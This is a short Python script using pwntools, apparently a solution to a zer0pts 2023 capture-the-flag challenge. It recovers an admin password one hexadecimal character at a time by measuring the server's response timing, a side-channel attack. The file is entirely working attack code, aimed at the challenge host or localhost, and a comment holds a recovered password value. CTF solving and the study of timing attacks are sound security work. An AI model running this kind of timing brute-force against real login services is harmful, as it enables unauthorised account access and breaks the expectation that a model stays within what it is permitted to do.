#!/usr/bin/env python3

from pwn import *
import sys
import time

# correct prefix => wait + send response + close socket
# incorrect prefix => wait + send response + wait + close socket
def try_prefix(pwd):
    if len(sys.argv) > 1 and sys.argv[1].startswith('r'):
        host = remote('misc2.2023.zer0pts.com', 10022)
    else:
        host = remote('localhost', 10022)

    host.recvuntil(b'Username: ')
    host.sendline(b'admin')
    host.recvuntil(b'Password: ')
    host.send(pwd.encode('ascii'))
    data = host.recvline()
    if data != b'Incorrect password.\n':
        print(f'got weird response: {data} for prefix {pwd}')
        exit(1)
    start = time.time()
    host.recvall()
    dur = time.time() - start
    host.close()
    return dur

def try_pwd(pwd):
    if len(sys.argv) > 1 and sys.argv[1].startswith('r'):
        host = remote('misc2.2023.zer0pts.com', 10022)
    else:
        host = remote('localhost', 10022)
    
    host.recvuntil(b'Username: ')
    host.sendline(b'admin')
    host.recvuntil(b'Password: ')
    host.sendline(pwd.encode('ascii'))
    data = host.recvline(timeout=2)
    return b'Logged in.' in data

CHARSET = '0123456789abcdef'
# 02872f5ae0819d2f
cur = ''

print('current delay:', try_prefix(cur))

while True:
    if try_pwd(cur):
        print('done!')
        print('password:', cur)
        break
    best_c = None
    best_delay = 999
    for i, c in enumerate(CHARSET):
        d = try_prefix(cur + c)
        print(c, d)
        if d < best_delay:
            best_c = c
            best_delay = d
        # extra speed at the cost of false positives
        if d < 0.005:
            break
    cur += best_c
    print('current prefix:', cur)
